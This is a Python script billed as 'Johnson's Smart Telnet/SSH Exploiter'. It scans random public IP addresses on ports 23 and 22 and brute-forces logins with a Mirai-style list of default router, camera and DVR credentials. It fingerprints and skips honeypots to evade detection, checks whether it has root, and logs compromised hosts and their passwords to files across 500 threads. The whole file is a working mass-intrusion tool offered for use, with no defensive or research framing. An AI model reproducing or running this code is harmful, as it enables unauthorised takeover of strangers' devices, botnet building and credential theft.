#!/usr/bin/env python3
"""
JOHNSON'S SMART TELNET/SSH EXPLOITER
- Random IP generation
- Port 23/22 scanning
- Smart credential brute forcing
- HONEYPOT DETECTION (doesn't attack honeypots)
- GIVES YOU ROOT ACCESS + LOGIN CREDENTIALS
- Saves all found credentials to file
"""

import socket
import telnetlib
import paramiko
import threading
import time
import random
import ipaddress
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import os

# ============= CONFIG =============
THREADS = 500
TIMEOUT = 5
SCAN_PORTS = [23, 22]  # Telnet and SSH
OUTPUT_FILE = "root_devices.txt"
SUCCESS_FILE = "root_creds.txt"

# ============= DEFAULT CREDENTIALS (MIRAI STYLE - 100+ combos) =============
TELNET_CREDS = [
    # Router/Modem defaults
    ("root", "root"), ("root", "12345"), ("root", "password"),
    ("admin", "admin"), ("admin", "1234"), ("admin", "password"),
    ("root", "xc3511"), ("root", "vizxv"), ("root", "hi3518"),
    ("root", "pass"), ("ubnt", "ubnt"), ("pi", "raspberry"),
    ("root", "default"), ("root", "123456"), ("root", "54321"),
    ("root", "1111"), ("root", "system"), ("root", "shell"),
    ("admin", "default"), ("support", "support"), ("user", "user"),
    ("guest", "guest"), ("root", "dreambox"), ("root", "fucker"),
    ("root", "toor"), ("root", "!root"), ("root", "realtek"),
    ("root", "klv123"), ("root", "zlmf2010"), ("admin", "123456"),
    ("admin", "1111"), ("admin", "2222"), ("admin", "3333"),
    ("root", "xmhdipc"), ("root", "juantech"), ("root", "zmodo"),
    ("root", "hik12345"), ("root", "hik456"), ("root", "dvr123"),
    ("admin", "xmhdipc"), ("admin", "juantech"), ("admin", "zmodo"),
    ("admin", "hik12345"), ("admin", "hik456"), ("admin", "dvr123"),
    ("Administrator", "admin"), ("tech", "tech"), ("mother", "fucker"),
    ("root", "1234"), ("root", "12345678"), ("root", "123456789"),
    ("admin", "12345678"), ("admin", "123456789"), ("admin", "qwerty"),
    ("admin", "abc123"), ("admin", "letmein"), ("admin", "monkey"),
]

SSH_CREDS = [
    ("root", "root"), ("root", "12345"), ("root", "password"),
    ("admin", "admin"), ("root", "toor"), ("root", "!root"),
    ("pi", "raspberry"), ("root", "default"), ("ubuntu", "ubuntu"),
    ("root", "123456"), ("root", "12345678"), ("admin", "123456"),
    ("user", "user"), ("test", "test"), ("oracle", "oracle"),
    ("postgres", "postgres"), ("mysql", "mysql"), ("ftp", "ftp"),
]

# ============= HONEYPOT DETECTION SIGNATURES =============
def is_honeypot_banner(banner):
    """Check if banner matches known honeypot signatures"""
    honeypot_indicators = [
        b"Kippo", b"Cowrie", b"Honeypot", b"honeyd",
        b"dionaea", b"conpot", b"snort", b"glastopf",
        b"ssh-honeypot", b"telnet-honeypot",
        b"SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10",  # Known honeypot
        b"SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2",  # Common honeypot
        b"SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7",  # Honeypot
        b"SSH-2.0-OpenSSH_5.1p1 Debian-5",  # Honeypot
        b"SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1.2",  # Honeypot
        b"Last login:", b"Welcome to Ubuntu",  # Too verbose = honeypot
    ]
    
    for indicator in honeypot_indicators:
        if indicator in banner:
            return True
    
    # Check for unrealistic response times (instant = honeypot)
    return False

def is_honeypot_response_time(start_time):
    """If response is too fast (< 0.1s), might be honeypot"""
    elapsed = time.time() - start_time
    return elapsed < 0.1

def is_honeypot_shell_behavior(tn):
    """Test shell behavior for honeypot patterns"""
    try:
        # Try common commands that honeypots often fake poorly
        tn.write(b"ls -la\n")
        time.sleep(1)
        result = tn.read_very_eager()
        
        # Honeypots often have fake/proxy outputs
        if b"Permission denied" in result and b"root" in result:
            return True
            
        # Try to check if it's a real system
        tn.write(b"ps aux\n")
        time.sleep(1)
        result = tn.read_very_eager()
        
        if len(result) < 50:  # Too short output = fake
            return True
            
    except:
        pass
    return False

# ============= IP GENERATOR =============
def random_ip():
    """Generate random public IP (avoid private ranges and honeypot-heavy ranges)"""
    # Prioritize countries with lots of vulnerable IoT devices
    preferred_prefixes = [
        1, 2, 3, 5, 14, 27, 31, 36, 39, 41, 42, 43, 45, 46, 49, 50, 58, 59, 60,
        61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78,
        79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96,
        97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111,
        112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125,
        126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140,
        141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154,
        155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168,
        169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182,
        183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
        197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210,
        211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223
    ]
    
    while True:
        first = random.choice(preferred_prefixes)
        ip = f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
        # Skip private ranges
        if first == 10: continue
        if first == 127: continue
        if first == 169 and ip.split('.')[1] == '254': continue
        if first == 172 and 16 <= int(ip.split('.')[1]) <= 31: continue
        if first == 192 and ip.split('.')[1] == '168': continue
        if first == 0: continue
        if first >= 224: continue
        
        return ip

# ============= PORT SCANNER =============
def scan_port(ip, port):
    """Check if port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        start = time.time()
        result = sock.connect_ex((ip, port))
        elapsed = time.time() - start
        
        # If connection too fast (< 0.1s) and port is open, might be honeypot
        if result == 0 and elapsed < 0.1:
            print(f"[!] {ip}:{port} - Suspiciously fast connection (potential honeypot)")
            sock.close()
            return False
            
        sock.close()
        return result == 0
    except:
        return False

# ============= TELNET BRUTE FORCE =============
def try_telnet(ip, port):
    """Try to login via telnet with default creds"""
    for user, password in TELNET_CREDS:
        try:
            start = time.time()
            tn = telnetlib.Telnet(ip, port, timeout=TIMEOUT)
            
            # Read banner
            banner = tn.read_some()
            
            # Check for honeypot banners
            if is_honeypot_banner(banner):
                print(f"[!] {ip}:{port} - Honeypot detected (banner match)")
                tn.close()
                return None, None, None
            
            # Check response time
            tn.read_until(b"login: ", timeout=2)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=2)
            tn.write(password.encode() + b"\n")
            
            # Wait for shell prompt
            result = tn.read_some()
            
            # Check for honeypot shell behavior
            if is_honeypot_shell_behavior(tn):
                print(f"[!] {ip}:{port} - Honeypot detected (shell behavior)")
                tn.close()
                return None, None, None
            
            tn.write(b"whoami\n")
            whoami = tn.read_some()
            tn.write(b"id\n")
            id_output = tn.read_some()
            tn.close()
            
            # Check if we got root
            is_root = b"root" in whoami or b"uid=0" in id_output
            
            if b"#" in result or b"$" in result or b">" in result:
                elapsed = time.time() - start
                print(f"\033[92m[+] TELNET SUCCESS: {ip}:{port} - {user}:{password} (root: {is_root}) [{elapsed:.2f}s]\033[0m")
                return user, password, is_root
                
        except Exception as e:
            continue
    return None, None, None

# ============= SSH BRUTE FORCE =============
def try_ssh(ip, port):
    """Try to login via SSH with default creds"""
    for user, password in SSH_CREDS:
        try:
            start = time.time()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Check banner for honeypot
            transport = paramiko.Transport((ip, port))
            transport.start_client()
            banner = transport.remote_version
            transport.close()
            
            if is_honeypot_banner(banner.encode()):
                print(f"[!] {ip}:{port} - Honeypot detected (SSH banner)")
                client.close()
                return None, None, None
            
            client.connect(ip, port=port, username=user, password=password, timeout=TIMEOUT, allow_agent=False, look_for_keys=False)
            
            # Check if we got root access
            stdin, stdout, stderr = client.exec_command('whoami')
            whoami = stdout.read().strip()
            
            stdin, stdout, stderr = client.exec_command('id')
            id_output = stdout.read().strip()
            
            client.close()
            
            is_root = b"root" in whoami or b"uid=0" in id_output
            
            elapsed = time.time() - start
            print(f"\033[92m[+] SSH SUCCESS: {ip}:{port} - {user}:{password} (root: {is_root}) [{elapsed:.2f}s]\033[0m")
            return user, password, is_root
            
        except Exception as e:
            continue
    return None, None, None

# ============= SAVE ROOT ACCESS =============
def save_root_access(ip, port, user, password, is_root, method):
    """Save found root credentials to file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save all found devices
    with open(OUTPUT_FILE, "a") as f:
        f.write(f"[{timestamp}] {ip}:{port} - {user}:{password} - {method} - Root: {is_root}\n")
    
    # Save only root accesses separately
    if is_root:
        with open(SUCCESS_FILE, "a") as f:
            f.write(f"{ip}:{port}|{user}|{password}|{method}|ROOT\n")
        print(f"\033[91m[!!!] ROOT ACCESS: {ip}:{port} - {user}:{password}\033[0m")

# ============= MAIN WORKER =============
def worker():
    """Main scanning and exploitation thread"""
    while True:
        ip = random_ip()
        
        for port in SCAN_PORTS:
            if scan_port(ip, port):
                print(f"[*] Found {ip}:{port} open")
                
                if port == 23:  # Telnet
                    user, password, is_root = try_telnet(ip, port)
                    if user:
                        save_root_access(ip, port, user, password, is_root, "TELNET")
                        
                elif port == 22:  # SSH
                    user, password, is_root = try_ssh(ip, port)
                    if user:
                        save_root_access(ip, port, user, password, is_root, "SSH")

# ============= STATS THREAD =============
def stats_thread():
    """Show statistics every 30 seconds"""
    start_time = time.time()
    root_count = 0
    
    while True:
        time.sleep(30)
        elapsed = time.time() - start_time
        
        if os.path.exists(SUCCESS_FILE):
            with open(SUCCESS_FILE, "r") as f:
                root_count = len(f.readlines())
        
        print(f"\n\033[94m[STATS] Running for {elapsed/60:.1f} minutes | Root accesses: {root_count}\033[0m\n")

# ============= MAIN =============
def main():
    print("""
\033[95m
╔══════════════════════════════════════════════════════════════╗
║        JOHNSON'S SMART TELNET/SSH EXPLOITER v2.0             ║
║     Random IP Scanner + Credential Bruteforce + Root Hunter  ║
║            HONEYPOT DETECTION - ONLY REAL DEVICES            ║
╚══════════════════════════════════════════════════════════════╝
\033[0m
    """)
    
    print(f"[+] Scanning with {THREADS} threads")
    print(f"[+] Target ports: {SCAN_PORTS}")
    print(f"[+] Saving results to: {OUTPUT_FILE} and {SUCCESS_FILE}")
    print(f"[+] Honeypot detection: ENABLED")
    print("[+] Press Ctrl+C to stop\n")
    
    # Create output files with headers
    with open(OUTPUT_FILE, "w") as f:
        f.write(f"# JOHNSON'S EXPLOITER - Started at {datetime.now()}\n")
        f.write("# IP:PORT | USER:PASS | METHOD | ROOT\n")
    
    with open(SUCCESS_FILE, "w") as f:
        f.write(f"# ROOT ACCESS ONLY - {datetime.now()}\n")
        f.write("# IP:PORT|USER|PASS|METHOD|ROOT\n")
    
    # Start stats thread
    stats = threading.Thread(target=stats_thread, daemon=True)
    stats.start()
    
    # Start worker threads
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            for _ in range(THREADS):
                executor.submit(worker)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        
        # Show final stats
        if os.path.exists(SUCCESS_FILE):
            with open(SUCCESS_FILE, "r") as f:
                roots = [l for l in f.readlines() if "ROOT" in l]
                print(f"\n[+] Total root accesses: {len(roots)}")
                print(f"[+] Check {SUCCESS_FILE} for all credentials")

if __name__ == "__main__":
    main()
